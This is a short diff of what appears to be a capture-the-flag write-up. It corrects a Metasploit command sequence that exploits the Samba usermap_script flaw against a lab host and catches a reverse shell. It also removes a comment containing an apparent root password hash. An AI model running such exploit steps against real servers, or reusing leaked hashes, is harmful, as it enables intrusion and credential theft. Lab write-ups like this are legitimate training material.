@@ -98,7 +98,7 @@ Matching Modules
 
 use exploit/multi/samba/usermap_script
 set RHOSTS 10.10.10.3
-set LPORT tun0
+set LHOST tun0
 run
 ```
 
@@ -119,5 +119,3 @@ cat /root/root.txt
 
 <redacted>
 ```
-
-<!-- root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0 -->
